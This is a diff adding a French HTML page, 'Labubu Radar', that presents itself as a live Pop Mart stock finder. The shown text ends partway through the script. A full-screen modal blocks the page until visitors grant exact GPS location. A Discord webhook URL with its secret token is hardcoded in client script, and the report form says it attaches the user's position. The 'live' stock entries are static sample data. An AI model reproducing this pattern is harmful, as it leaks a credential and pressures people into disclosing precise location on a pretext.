@@ -1,0 +1,1038 @@
+```html
+<!DOCTYPE html>
+<html lang="fr" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Labubu Radar & Stock Finder - Pop Mart World</title>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        labubu: {
+                            pink: '#ff6b9d',
+                            pinkNeon: '#ff3385',
+                            pinkGlow: 'rgba(255, 107, 157, 0.4)',
+                            softPink: '#ffe6f0',
+                            brown: '#5c3a21',
+                            lightBrown: '#8c5a47',
+                            cream: '#fff8f0',
+                            gold: '#ffd166',
+                            green: '#06d6a0',
+                            darkBg: '#181016',
+                            darkCard: '#241722',
+                            darkCardHover: '#301f2e'
+                        }
+                    },
+                    boxShadow: {
+                        'labubu-pink': '0 0 25px rgba(255, 107, 157, 0.35)',
+                        'labubu-gold': '0 0 20px rgba(255, 209, 102, 0.3)',
+                        'labubu-card': '0 8px 30px rgba(0, 0, 0, 0.4)'
+                    },
+                    animation: {
+                        'float': 'float 3s ease-in-out infinite',
+                        'pulse-glow': 'pulseGlow 2s infinite',
+                        'bounce-soft': 'bounceSoft 2s infinite'
+                    },
+                    keyframes: {
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0px)' },
+                            '50%': { transform: 'translateY(-8px)' },
+                        },
+                        bounceSoft: {
+                            '0%, 100%': { transform: 'translateY(0)' },
+                            '50%': { transform: 'translateY(-5px)' }
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <!-- Leaflet.js (Map CSS & JS) -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #181016;
+            background-image: 
+                radial-gradient(circle at 15% 15%, rgba(255, 107, 157, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 85% 85%, rgba(255, 209, 102, 0.07) 0%, transparent 40%);
+            color: #fceade;
+        }
+
+        .font-labubu {
+            font-family: 'Fredoka', cursive, sans-serif;
+        }
+
+        /* Glassmorphism styling */
+        .glass-panel {
+            background: rgba(36, 23, 34, 0.85);
+            backdrop-filter: blur(14px);
+            border: 1px solid rgba(255, 107, 157, 0.2);
+        }
+
+        .glass-card {
+            background: rgba(36, 23, 34, 0.65);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 107, 157, 0.15);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .glass-card:hover {
+            border-color: rgba(255, 107, 157, 0.5);
+            box-shadow: 0 0 25px rgba(255, 107, 157, 0.25);
+            transform: translateY(-3px);
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #181016;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #5c3a21;
+            border-radius: 6px;
+            border: 2px solid #181016;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #ff6b9d;
+        }
+
+        /* Leaflet Dark Map Overrides */
+        .leaflet-container {
+            background: #191219 !important;
+            border-radius: 1rem;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+        .leaflet-popup-content-wrapper, .leaflet-popup-tip {
+            background: #241722 !important;
+            color: #fff !important;
+            border: 1px solid rgba(255, 107, 157, 0.4);
+            box-shadow: 0 0 15px rgba(255, 107, 157, 0.3);
+        }
+        .leaflet-popup-content {
+            margin: 12px 14px !important;
+            line-height: 1.4 !important;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between selection:bg-labubu-pink selection:text-black">
+
+    <!-- ÉCRAN DE VERROUILLAGE GÉOLOCALISATION OBLIGATOIRE -->
+    <div id="geo-lock-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/95 backdrop-blur-2xl">
+        <div class="glass-panel w-full max-w-lg rounded-3xl border-2 border-labubu-pink/60 p-6 sm:p-8 space-y-6 text-center relative shadow-labubu-pink animate-in fade-in zoom-in duration-300">
+            
+            <!-- Avatar Header -->
+            <div class="relative w-24 h-24 mx-auto">
+                <div class="absolute inset-0 rounded-full bg-labubu-pink/20 animate-ping"></div>
+                <div class="w-24 h-24 rounded-full bg-gradient-to-tr from-labubu-pink via-purple-500 to-labubu-gold p-1 shadow-labubu-pink flex items-center justify-center">
+                    <div class="w-full h-full rounded-full bg-labubu-darkBg flex items-center justify-center text-4xl">
+                        🐰✨
+                    </div>
+                </div>
+            </div>
+
+            <div class="space-y-2">
+                <span class="inline-block px-3 py-1 rounded-full bg-labubu-pink/20 text-labubu-pink border border-labubu-pink/40 text-xs font-bold font-labubu tracking-wider">
+                    POP MART LABUBU RADAR
+                </span>
+                <h2 class="text-2xl sm:text-3xl font-extrabold text-white font-labubu tracking-wide">
+                    Active ton GPS pour continuer !
+                </h2>
+                <p class="text-xs sm:text-sm text-gray-300 leading-relaxed">
+                    Pour accéder au radar en temps réel et localiser les figurines <span class="text-labubu-pink font-bold">The Monsters & Labubu</span> autour de toi, autorise la géolocalisation exacte.
+                </p>
+            </div>
+
+            <!-- Box d'erreur si GPS refusé -->
+            <div id="geo-error-box" class="hidden bg-red-500/10 border border-red-500/40 rounded-2xl p-4 text-left space-y-2 text-xs text-red-200">
+                <div class="flex items-center gap-2 font-bold text-red-400">
+                    <i data-lucide="alert-triangle" class="w-4 h-4"></i>
+                    <span>Accès GPS indisponible ou refusé</span>
+                </div>
+                <p id="geo-error-msg">Veuillez débloquer l'accès aux données GPS dans les réglages de votre navigateur.</p>
+                <div class="pt-2 text-[11px] text-gray-300 space-y-1">
+                    <p class="font-bold text-labubu-gold">Comment débloquer ?</p>
+                    <p>• <strong>Safari (iOS/Mac) :</strong> Réglages > Confidentialité > Service de localisation > Safari.</p>
+                    <p>• <strong>Chrome (Android/PC) :</strong> Icône de cadenas 🔒 à côté de l'URL > Autoriser la position.</p>
+                </div>
+            </div>
+
+            <!-- Bouton d'activation -->
+            <div class="space-y-3 pt-2">
+                <button id="request-geo-btn" onclick="requestMandatoryLocation()" class="w-full flex items-center justify-center gap-2 bg-gradient-to-r from-labubu-pink to-labubu-pinkNeon hover:from-labubu-pinkNeon hover:to-labubu-pink text-white font-extrabold text-sm sm:text-base py-4 px-6 rounded-2xl shadow-labubu-pink transition transform active:scale-95 font-labubu">
+                    <i data-lucide="map-pin" class="w-5 h-5 animate-bounce"></i>
+                    <span>Activer ma position GPS exacte</span>
+                </button>
+                <p class="text-[11px] text-gray-400">
+                    🔒 Vos données GPS permettent de calculer la distance exacte avec les boutiques Pop Mart.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header Navigation -->
+    <header class="sticky top-0 z-40 glass-panel border-b border-labubu-pink/20 px-4 lg:px-8 py-3.5">
+        <div class="max-w-7xl mx-auto flex items-center justify-between">
+            <!-- Brand Logo -->
+            <div class="flex items-center gap-3">
+                <div class="w-11 h-11 rounded-2xl bg-gradient-to-br from-labubu-pink to-purple-600 p-0.5 shadow-labubu-pink">
+                    <div class="w-full h-full bg-labubu-darkBg rounded-[14px] flex items-center justify-center text-xl">
+                        🐰
+                    </div>
+                </div>
+                <div>
+                    <h1 class="font-extrabold text-lg sm:text-xl tracking-tight text-white font-labubu flex items-center gap-2">
+                        LABUBU <span class="text-xs font-sans font-bold uppercase tracking-wider px-2.5 py-0.5 rounded-full bg-labubu-pink/20 border border-labubu-pink/40 text-labubu-pink">RADAR</span>
+                    </h1>
+                    <p class="text-[11px] text-gray-400">Pop Mart & The Monsters Live Finder</p>
+                </div>
+            </div>
+
+            <!-- Header Actions -->
+            <div class="flex items-center gap-3">
+                <button onclick="requestMandatoryLocation()" class="hidden sm:flex items-center gap-2 bg-labubu-darkCard hover:bg-labubu-darkCardHover text-gray-200 text-xs font-semibold px-3.5 py-2.5 rounded-xl border border-labubu-pink/30 hover:border-labubu-pink transition">
+                    <i data-lucide="navigation" class="w-4 h-4 text-labubu-pink"></i>
+                    <span id="header-gps-label">GPS Actif</span>
+                </button>
+                <button onclick="openReportModal()" class="flex items-center gap-2 bg-gradient-to-r from-labubu-pink to-purple-500 hover:opacity-95 text-white font-bold text-xs sm:text-sm px-4 py-2.5 rounded-xl shadow-labubu-pink transition transform active:scale-95 font-labubu">
+                    <i data-lucide="plus-circle" class="w-4 h-4"></i>
+                    <span>Signaler un Stock</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Layout -->
+    <main class="max-w-7xl w-full mx-auto px-4 lg:px-8 py-6 flex-grow grid grid-cols-1 lg:grid-cols-12 gap-6">
+
+        <!-- Sidebar / Filter Panel -->
+        <aside class="lg:col-span-4 space-y-5">
+
+            <!-- Hero Banner Card -->
+            <div class="glass-panel p-5 rounded-3xl relative overflow-hidden border border-labubu-pink/30 bg-gradient-to-br from-labubu-darkCard to-purple-950/20">
+                <div class="absolute -right-6 -bottom-6 w-32 h-32 bg-labubu-pink/15 rounded-full blur-2xl pointer-events-none"></div>
+                <div class="flex items-start justify-between mb-3">
+                    <span class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-bold bg-labubu-pink/20 text-labubu-pink border border-labubu-pink/40 font-labubu">
+                        <span class="w-2 h-2 rounded-full bg-labubu-pink animate-ping"></span> Live Stock Tracker
+                    </span>
+                    <span id="user-geo-coords" class="text-[11px] text-gray-400 font-mono">GPS: --, --</span>
+                </div>
+                <h2 class="text-xl font-extrabold text-white font-labubu mb-1">Trouve ton Labubu rare 💖</h2>
+                <p class="text-xs text-gray-300 mb-4 leading-relaxed">
+                    Explore les boutiques Pop Mart, corners & pop-up stores répertoriés en temps réel avec distances exactes.
+                </p>
+                <button onclick="requestMandatoryLocation()" class="w-full flex items-center justify-center gap-2 bg-labubu-pink/15 hover:bg-labubu-pink/25 text-labubu-pink border border-labubu-pink/40 font-bold text-xs py-2.5 px-4 rounded-xl transition">
+                    <i data-lucide="rotate-cw" class="w-4 h-4"></i>
+                    <span>Actualiser ma position GPS</span>
+                </button>
+            </div>
+
+            <!-- Interactive Map Box -->
+            <div class="glass-panel p-3 rounded-3xl space-y-2">
+                <div class="flex items-center justify-between px-2 pt-1">
+                    <h3 class="font-bold text-xs text-gray-200 flex items-center gap-2 font-labubu">
+                        <i data-lucide="map" class="w-4 h-4 text-labubu-pink"></i> Carte interactive des boutiques
+                    </h3>
+                    <span class="text-[10px] text-labubu-gold bg-labubu-gold/10 px-2 py-0.5 rounded-full border border-labubu-gold/30">Live Map</span>
+                </div>
+                <div id="map" class="w-full h-56 rounded-2xl border border-labubu-pink/20 shadow-inner"></div>
+            </div>
+
+            <!-- Filters Card -->
+            <div class="glass-panel p-5 rounded-3xl space-y-4">
+                <div class="flex items-center justify-between pb-2 border-b border-gray-800">
+                    <h3 class="font-bold text-sm text-gray-200 flex items-center gap-2 font-labubu">
+                        <i data-lucide="sliders" class="w-4 h-4 text-labubu-pink"></i> Filtres Pop Mart
+                    </h3>
+                    <button onclick="resetFilters()" class="text-xs text-gray-400 hover:text-labubu-pink transition">Réinitialiser</button>
+                </div>
+
+                <!-- Search Input -->
+                <div class="relative">
+                    <i data-lucide="search" class="w-4 h-4 absolute left-3.5 top-3 text-gray-500"></i>
+                    <input type="text" id="search-input" oninput="applyFilters()" placeholder="Nom boutique, ville, modèle..." 
+                        class="w-full bg-labubu-darkBg border border-gray-800 focus:border-labubu-pink focus:ring-1 focus:ring-labubu-pink rounded-xl pl-9 pr-4 py-2.5 text-xs text-gray-200 placeholder-gray-500 outline-none transition">
+                </div>
+
+                <!-- Labubu Series Filter -->
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1.5">Série / Collection Labubu</label>
+                    <select id="series-filter" onchange="applyFilters()" class="w-full bg-labubu-darkBg border border-gray-800 focus:border-labubu-pink rounded-xl px-3 py-2.5 text-xs text-gray-200 outline-none transition">
+                        <option value="ALL">Toutes les collections</option>
+                        <option value="Have a Seat">Have a Seat (Sitting Vinyl Plush)</option>
+                        <option value="Exciting Macaron">Exciting Macaron Vinyl Face</option>
+                        <option value="Fall in Wild">Fall in Wild Series</option>
+                        <option value="Be Fancy Now">Labubu x Pronounce - Be Fancy Now</option>
+                        <option value="Zimomo">Zimomo / King Labubu</option>
+                        <option value="Mokoko">Mokoko Sweet Heart Edition</option>
+                        <option value="Tasty Macarons">Tasty Macarons Blind Box</option>
+                    </select>
+                </div>
+
+                <!-- City Filter -->
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1.5">Ville</label>
+                    <select id="city-filter" onchange="applyFilters()" class="w-full bg-labubu-darkBg border border-gray-800 focus:border-labubu-pink rounded-xl px-3 py-2.5 text-xs text-gray-200 outline-none transition">
+                        <option value="ALL">Toutes les villes</option>
+                        <option value="Paris">Paris & IDF</option>
+                        <option value="Lyon">Lyon</option>
+                        <option value="Marseille">Marseille</option>
+                        <option value="Lille">Lille</option>
+                        <option value="Nice">Nice</option>
+                        <option value="Toulouse">Toulouse</option>
+                    </select>
+                </div>
+
+                <!-- Stock Filter -->
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1.5">Statut du Stock</label>
+                    <div class="grid grid-cols-3 gap-2">
+                        <button onclick="setStockFilter('ALL')" id="filter-stock-all" class="stock-filter-btn active text-xs py-2 px-1 rounded-xl border text-center font-semibold transition bg-labubu-pink/20 border-labubu-pink text-labubu-pink">
+                            Tous
+                        </button>
+                        <button onclick="setStockFilter('IN_STOCK')" id="filter-stock-in" class="stock-filter-btn text-xs py-2 px-1 rounded-xl border text-center font-semibold transition bg-labubu-darkBg border-gray-800 text-gray-400 hover:border-labubu-pink/50">
+                            En Stock
+                        </button>
+                        <button onclick="setStockFilter('LIMITED')" id="filter-stock-lim" class="stock-filter-btn text-xs py-2 px-1 rounded-xl border text-center font-semibold transition bg-labubu-darkBg border-gray-800 text-gray-400 hover:border-labubu-pink/50">
+                            Limité
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Range distance -->
+                <div id="distance-range-container">
+                    <div class="flex justify-between items-center mb-1">
+                        <label class="text-xs font-semibold text-gray-400">Rayon GPS maximal</label>
+                        <span id="distance-val" class="text-xs text-labubu-pink font-bold">100 km</span>
+                    </div>
+                    <input type="range" id="distance-range" min="5" max="300" step="5" value="100" oninput="updateDistanceVal(this.value)" class="w-full accent-labubu-pink cursor-pointer">
+                </div>
+            </div>
+
+            <!-- Stats Bar -->
+            <div class="glass-panel p-4 rounded-3xl grid grid-cols-3 gap-2 text-center">
+                <div>
+                    <p class="text-[11px] text-gray-400">Boutiques</p>
+                    <p id="stat-total-stores" class="text-lg font-extrabold text-white font-labubu">0</p>
+                </div>
+                <div>
+                    <p class="text-[11px] text-gray-400">En Stock</p>
+                    <p id="stat-in-stock" class="text-lg font-extrabold text-labubu-green font-labubu">0</p>
+                </div>
+                <div>
+                    <p class="text-[11px] text-gray-400">Ruptures</p>
+                    <p id="stat-out-of-stock" class="text-lg font-extrabold text-red-400 font-labubu">0</p>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Stores Grid & List -->
+        <section class="lg:col-span-8 flex flex-col space-y-4">
+            
+            <!-- List Header Controls -->
+            <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 bg-labubu-darkCard/60 p-3.5 rounded-2xl border border-labubu-pink/15">
+                <span class="text-xs font-medium text-gray-300 flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-labubu-pink"></span>
+                    <span id="results-count" class="text-white font-bold font-labubu">0</span> points de vente trouvés
+                </span>
+                <div class="flex items-center gap-2 w-full sm:w-auto">
+                    <label class="text-xs text-gray-400">Trier :</label>
+                    <select id="sort-select" onchange="applyFilters()" class="w-full sm:w-auto bg-labubu-darkBg border border-gray-800 text-xs text-gray-200 rounded-xl px-3 py-1.5 outline-none focus:border-labubu-pink">
+                        <option value="distance">Distance GPS la plus proche</option>
+                        <option value="name">Nom du magasin</option>
+                        <option value="stock">Disponibilité du stock</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Dynamic Stores Grid -->
+            <div id="stores-container" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <!-- Populated dynamically -->
+            </div>
+
+            <!-- Empty State -->
+            <div id="empty-state" class="hidden glass-panel p-12 text-center rounded-3xl space-y-3 border-dashed border-gray-800">
+                <div class="text-4xl animate-bounce">🐰💧</div>
+                <h3 class="text-base font-bold text-gray-300 font-labubu">Aucun stock Labubu ne correspond aux critères</h3>
+                <p class="text-xs text-gray-400 max-w-sm mx-auto">Tente d'élargir le rayon GPS ou de changer la collection filtrée.</p>
+                <button onclick="resetFilters()" class="text-xs bg-labubu-pink/20 text-labubu-pink border border-labubu-pink/40 hover:bg-labubu-pink/30 px-4 py-2 rounded-xl transition font-bold font-labubu">Réinitialiser les filtres</button>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="border-t border-labubu-pink/15 py-6 px-4 text-center text-xs text-gray-400 mt-10 glass-panel">
+        <div class="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
+            <p>© 2026 Labubu Finder Community • Univers Pop Mart & The Monsters</p>
+            <div class="flex items-center gap-4">
+                <span class="flex items-center gap-1.5 text-labubu-pink"><span class="w-2 h-2 rounded-full bg-labubu-pink animate-ping"></span> Discord Webhook Actif</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- MODAL: SIGNALER UN STOCK (WITH DISCORD WEBHOOK) -->
+    <div id="report-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md hidden">
+        <div class="glass-panel w-full max-w-lg rounded-3xl border-2 border-labubu-pink/40 p-6 space-y-4 relative animate-in fade-in zoom-in duration-200">
+            <!-- Close Button -->
+            <button onclick="closeReportModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white p-1.5 rounded-xl bg-gray-800/50 hover:bg-gray-800">
+                <i data-lucide="x" class="w-5 h-5"></i>
+            </button>
+
+            <!-- Modal Header -->
+            <div class="flex items-center gap-3">
+                <div class="w-12 h-12 rounded-2xl bg-gradient-to-tr from-labubu-pink to-purple-500 p-0.5 shadow-labubu-pink flex items-center justify-center text-2xl">
+                    🛍️
+                </div>
+                <div>
+                    <h3 class="font-bold text-white text-lg font-labubu">Signaler un Stock Labubu</h3>
+                    <p class="text-xs text-gray-300">Envoie l'alerte directe sur le Webhook Discord communautaire</p>
+                </div>
+            </div>
+
+            <!-- Form -->
+            <form id="stock-report-form" onsubmit="submitStockReport(event)" class="space-y-3.5 pt-2">
+                <div>
+                    <label class="block text-xs font-semibold text-gray-300 mb-1">Sélectionner un magasin *</label>
+                    <select id="form-store-select" required class="w-full bg-labubu-darkBg border border-gray-800 focus:border-labubu-pink rounded-xl px-3 py-2.5 text-xs text-gray-200 outline-none">
+                        <!-- Options generated dynamically -->
+                    </select>
+                </div>
+
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="block text-xs font-semibold text-gray-300 mb-1">Collection Labubu *</label>
+                        <select id="form-series" required class="w-full bg-labubu-darkBg border border-gray-800 focus:border-labubu-pink rounded-xl px-3 py-2.5 text-xs text-gray-200 outline-none">
+                            <option value="Have a Seat (Sitting Vinyl Plush)">Have a Seat (Sitting Vinyl Plush)</option>
+                            <option value="Exciting Macaron Vinyl Face">Exciting Macaron Vinyl Face</option>
+                            <option value="Fall in Wild Series">Fall in Wild Series</option>
+                            <option value="Be Fancy Now (Pronounce)">Be Fancy Now (Pronounce)</option>
+                            <option value="Zimomo / King Labubu">Zimomo / King Labubu</option>
+                            <option value="Mokoko Sweet Heart Edition">Mokoko Sweet Heart Edition</option>
+                            <option value="Tasty Macarons Blind Box">Tasty Macarons Blind Box</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-gray-300 mb-1">Disponibilité constatée *</label>
+                        <select id="form-status" required class="w-full bg-labubu-darkBg border border-gray-800 focus:border-labubu-pink rounded-xl px-3 py-2.5 text-xs text-gray-200 outline-none">
+                            <option value="En Stock">En Stock (Plusieurs)</option>
+                            <option value="Stock Limité">Stock Limité (&lt; 5 pcs)</option>
+                            <option value="Rupture de Stock">Rupture de Stock</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold text-gray-300 mb-1">Quantité exacte / Estimée</label>
+                    <input type="text" id="form-quantity" placeholder="Ex: 12 pièces / Restockage à 14h" 
+                        class="w-full bg-labubu-darkBg border border-gray-800 focus:border-labubu-pink rounded-xl px-3 py-2.5 text-xs text-gray-200 placeholder-gray-500 outline-none">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold text-gray-300 mb-1">Remarques / Conditions en magasin</label>
+                    <textarea id="form-notes" rows="2" placeholder="Ex: File d'attente à l'entrée, maximum 1 pièce par personne..." 
+                        class="w-full bg-labubu-darkBg border border-gray-800 focus:border-labubu-pink rounded-xl px-3 py-2.5 text-xs text-gray-200 placeholder-gray-500 outline-none resize-none"></textarea>
+                </div>
+
+                <div class="bg-labubu-darkBg p-3 rounded-2xl border border-labubu-pink/20 flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <i data-lucide="map-pin" class="w-4 h-4 text-labubu-pink"></i>
+                        <span class="text-xs text-gray-300" id="form-coords-display">Position GPS attachée</span>
+                    </div>
+                    <span class="text-[10px] text-labubu-pink font-bold bg-labubu-pink/10 px-2 py-0.5 rounded-full">GPS Live</span>
+                </div>
+
+                <div class="pt-2 flex gap-3">
+                    <button type="button" onclick="closeReportModal()" class="w-1/2 bg-gray-800 hover:bg-gray-700 text-gray-300 text-xs font-bold py-3 rounded-xl transition">
+                        Annuler
+                    </button>
+                    <button type="submit" id="submit-btn" class="w-1/2 bg-gradient-to-r from-labubu-pink to-labubu-pinkNeon hover:opacity-90 text-white font-extrabold text-xs py-3 rounded-xl shadow-labubu-pink transition flex items-center justify-center gap-2 font-labubu">
+                        <i data-lucide="send" class="w-4 h-4"></i>
+                        <span>Publier sur Discord</span>
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="fixed bottom-5 right-5 z-50 transform translate-y-20 opacity-0 transition-all duration-300 pointer-events-none">
+        <div class="glass-panel border-2 border-labubu-pink text-white px-5 py-3.5 rounded-2xl shadow-labubu-pink flex items-center gap-3">
+            <div id="toast-icon" class="text-labubu-pink text-xl">
+                ✨
+            </div>
+            <div>
+                <p id="toast-title" class="font-bold text-xs font-labubu">Notification Pop Mart</p>
+                <p id="toast-msg" class="text-xs text-gray-300">Message de confirmation</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Application Script Logic -->
+    <script>
+        // Webhook Discord Officiel
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1565897913379328100/Z0oV4Ukzp635XQwQ7v8rAh9-VLrLncAZyXdWZyuiEGEhe0hKcFmyUpeLQB3o1-nkq6v8";
+
+        // Base de données étendue des magasins & stocks Labubu
+        let stores = [
+            {
+                id: 1,
+                name: "POP MART Flagship Paris Paix",
+                city: "Paris",
+                address: "15 Rue de la Paix, 75002 Paris",
+                lat: 48.8693,
+                lng: 2.3312,
+                status: "IN_STOCK",
+                statusText: "En Stock",
+                lastUpdate: "Il y a 10 min",
+                items: [
+                    { name: "Have a Seat (Sitting Vinyl)", status: "En Stock", qty: "18 pcs" },
+                    { name: "Exciting Macaron Vinyl Face", status: "En Stock", qty: "24 pcs" },
+                    { name: "Fall in Wild Series", status: "Stock Limité", qty: "3 pcs" }
+                ]
+            },
+            {
+                id: 2,
+                name: "POP MART Forum des Halles",
+                city: "Paris",
+                address: "101 Porte Berger, 75001 Paris",
+                lat: 48.8622,
+                lng: 2.3458,
+                status: "LIMITED",
+                statusText: "Stock Limité",
+                lastUpdate: "Il y a 35 min",
+                items: [
+                    { name: "Tasty Macarons Blind Box", status: "Stock Limité", qty: "4 pcs" },
+                    { name: "Be Fancy Now (Pronounce)", status: "Stock Limité", qty: "2 pcs" }
+                ]
+            },
+            {
+                id: 3,
+                name: "Le Bon Marché Rive Gauche (Pop-Up)",
+                city: "Paris",
+                address: "24 Rue de Sèvres, 75007 Paris",
+                lat: 48.8508,
+                lng: 2.3248,
+                status: "OUT_OF_STOCK",
+                statusText: "Rupture de Stock",
+                lastUpdate: "Il y a 2 heures",
+                items: [
+                    { name: "Mokoko Sweet Heart Edition", status: "Rupture", qty: "0" }
+                ]
+            },
+            {
+                id: 4,
+                name: "POP MART Lyon Part-Dieu",
+                city: "Lyon",
+                address: "17 Boulevard Vivier Merle, 69003 Lyon",
+                lat: 45.7606,
+                lng: 4.8596,
+                status: "IN_STOCK",
+                statusText: "En Stock",
+                lastUpdate: "Il y a 15 min",
+                items: [
+                    { name: "Have a Seat (Sitting Vinyl)", status: "En Stock", qty: "12 pcs" },
+                    { name: "Zimomo / King Labubu", status: "Stock Limité", qty: "1 pc" }
+                ]
+            },
+            {
+                id: 5,
+                name: "Boutique Pop Culture St-Ferréol",
+                city: "Marseille",
+                address: "42 Rue St-Ferréol, 13001 Marseille",
+                lat: 43.2941,
+                lng: 5.3764,
+                status: "LIMITED",
+                statusText: "Stock Limité",
+                lastUpdate: "Il y a 1 heure",
+                items: [
+                    { name: "Exciting Macaron Vinyl Face", status: "Stock Limité", qty: "5 pcs" }
+                ]
+            },
+            {
+                id: 6,
+                name: "POP MART Lille Euralille",
+                city: "Lille",
+                address: "100 Centre Commercial Euralille, 59777 Lille",
+                lat: 50.6372,
+                lng: 3.0725,
+                status: "IN_STOCK",
+                statusText: "En Stock",
+                lastUpdate: "Il y a 5 min",
+                items: [
+                    { name: "Tasty Macarons Blind Box", status: "En Stock", qty: "30 pcs" },
+                    { name: "Have a Seat (Sitting Vinyl)", status: "En Stock", qty: "15 pcs" }
+                ]
+            },
+            {
+                id: 7,
+                name: "Galeries Lafayette Nice Masséna",
+                city: "Nice",
+                address: "6 Avenue Jean Médecin, 06000 Nice",
+                lat: 43.6985,
+                lng: 7.2687,
+                status: "OUT_OF_STOCK",
+                statusText: "Rupture de Stock",
+                lastUpdate: "Hier",
+                items: []
+            },
+            {
+                id: 8,
+                name: "Comics & Toys Toulouse",
+                city: "Toulouse",
+                address: "12 Rue Lapeyrouse, 31000 Toulouse",
+                lat: 43.6035,
+                lng: 1.4462,
+                status: "LIMITED",
+                statusText: "Stock Limité",
+                lastUpdate: "Il y a 4 heures",
+                items: [
+                    { name: "Be Fancy Now (Pronounce)", status: "Stock Limité", qty: "2 pcs" }
+                ]
+            }
+        ];
+
+        // App Global State
+        let userCoords = null;
+        let selectedStockFilter = 'ALL';
+        let leafletMap = null;
+        let mapMarkers = [];
+
+        window.onload = function() {
+            lucide.createIcons();
+            initLeafletMap();
+            populateFormStores();
+            applyFilters();
+            
+            // Exiger obligatoirement la géolocalisation dès l'ouverture
+            requestMandatoryLocation();
+        };
+
+        // Initialisation Carte Leaflet
+        function initLeafletMap() {
+            leafletMap = L.map('map', { zoomControl: false }).setView([46.603354, 1.888334], 5);
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                attribution: '&copy; OpenStreetMap &copy; CARTO',
+                subdomains: 'abcd',
+                maxZoom: 19
+            }).addTo(leafletMap);
+        }
+
+        // Met à jour les marqueurs de la carte interactive
+        function updateMapMarkers(storesToDisplay) {
+            if (!leafletMap) return;
+
+            mapMarkers.forEach(marker => leafletMap.removeLayer(marker));
+            mapMarkers = [];
+
+            if (userCoords) {
+                const userIcon = L.divIcon({
+                    className: 'custom-user-pin',
+                    html: `<div class="w-7 h-7 rounded-full bg-labubu-pink border-2 border-white shadow-labubu-pink flex items-center justify-center text-xs animate-bounce">💖</div>`,
+                    iconSize: [28, 28],
+                    iconAnchor: [14, 14]
+                });
+                const userMarker = L.marker([userCoords.lat, userCoords.lng], { icon: userIcon })
+                    .addTo(leafletMap)
+                    .bindPopup(`<b>Votre position GPS</b><br>Recherche active`);
+                mapMarkers.push(userMarker);
+            }
+
+            storesToDisplay.forEach(store => {
+                let pinColor = "#06d6a0";
+                let emoji = "🛍️";
+                if (store.status === "LIMITED") { pinColor = "#ffd166"; emoji = "⚠️"; }
+                if (store.status === "OUT_OF_STOCK") { pinColor = "#ef4444"; emoji = "❌"; }
+
+                const storeIcon = L.divIcon({
+                    className: 'custom-store-pin',
+                    html: `<div style="background-color: ${pinColor};" class="w-8 h-8 rounded-full border-2 border-white shadow-lg flex items-center justify-center text-xs font-bold text-black transform hover:scale-110 transition">${emoji}</div>`,
+                    iconSize: [32, 32],
+                    iconAnchor: [16, 16]
+                });
+
+                const popupContent = `
+                    <div style="font-family:'Plus Jakarta Sans', sans-serif;">
+                        <strong style="color:#ff6b9d; font-size:13px;">${store.name}</strong><br>
+                        <span style="font-size:11px; color:#ccc;">${store.address}</span><br>
+                        <span style="font-size:11px; font-weight:bold; color:${pinColor};">Statut: ${store.statusText}</span>
+                    </div>
+                `;
+
+                const marker = L.marker([store.lat, store.lng], { icon: storeIcon })
+                    .addTo(leafletMap)
+                    .bindPopup(popupContent);
+
+                mapMarkers.push(marker);
+            });
+        }
+
+        // Demande obligatoire de la géolocalisation
+        function requestMandatoryLocation() {
+            const errorBox = document.getElementById('geo-error-box');
